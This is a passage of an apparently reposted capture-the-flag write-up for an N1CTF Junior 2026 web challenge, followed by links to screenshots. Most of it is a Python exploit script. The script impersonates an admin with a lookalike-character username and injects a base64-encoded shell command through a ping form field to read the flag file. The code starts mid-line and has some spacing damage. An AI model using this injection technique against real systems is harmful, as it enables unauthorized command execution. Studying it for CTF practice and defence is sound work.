# N1CTF Junior 2026 1/2-WEB

> 原文: https://www.ctfiot.com/294851.html
> ID: 294851

“, html, flags=re.S)

 ifnot m:

 return“”

 returnm.group(1).strip()

def exploit():

 s= requests.Session()

 s.post(f”{TARGET_URL}/set_user_session”,data={“username”: “admu0131n”}, timeout=10)

 cmd= “cat /flag”

 b64= base64.b64encode(cmd.encode()).decode()

 payload= f”::1%; echo {b64} | base64 -d | sh”

 r= s.post(f”{TARGET_URL}/ping”, data={“target”: payload}, timeout=10)

 out= extract_pre(r.text)

 ifout:

 print(out)

 else:

 print(“[-]未提取到输出，检查是否命令回显/模板结构变化/或服务端过滤。”)

if __name__ == “__main__”:

 exploit()


```
(.*?)
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/01/1769675045-wxsync-2026-01-cef90d3d3307f0269f1ecbc81bee8c7f.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/01/1769675047-wxsync-2026-01-b2ef588e81c0633939b3565cfdff7c2b.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/01/1769675049-wxsync-2026-01-c4ad14e3534ab784a156b2d983395b29.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/01/1769675051-wxsync-2026-01-dd69ae2200b44cefaa54a1790cd7040c.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/01/1769675053-wxsync-2026-01-958e1ca79f8129e4c1ced704a1f5f352.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/01/1769675054-wxsync-2026-01-d1f9f28213d54bcaa59f01cb5500ea1a.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/01/1769675056-wxsync-2026-01-b3743ae219e2b277bea56d0f25605d55.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/01/1769675058-wxsync-2026-01-0a310b7d1979d9d6b57d4c19c3be60ea.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/01/1769675060-wxsync-2026-01-b952326aaa2a12ea519f185d9fe14802.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/01/1769675062-wxsync-2026-01-9ce6a00103a39419115a0a566ae7da42.png)